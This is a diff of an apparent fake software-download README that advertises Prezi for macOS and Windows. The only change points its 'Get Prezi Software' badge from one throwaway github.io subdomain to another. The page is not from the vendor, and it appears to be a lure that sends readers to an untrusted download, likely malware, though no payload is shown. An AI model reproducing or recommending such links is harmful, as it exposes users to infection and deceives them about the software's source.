@@ -3,7 +3,7 @@
 **Prezi** revolutionizes how presentations are made — replacing static slides with dynamic, cinematic storytelling that keeps audiences engaged.  
 Available for **macOS** and **Windows**, Prezi combines zoom-based motion graphics, live collaboration, and cloud syncing — optimized for **Apple Silicon** performance. 🍎💻  
 
-[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Prezi%20Software-0A66C2?style=for-the-badge&logo=github&logoColor=white)](https://desk-load-app.github.io/.github/?offer=PreziApp)
+[![💙 Get GitHub Instruction](https://img.shields.io/badge/💙%20Get%20Prezi%20Software-0A66C2?style=for-the-badge&logo=github&logoColor=white)](https://hubset-desk.github.io/.github/?offer=PreziApp)
 
 ---
 
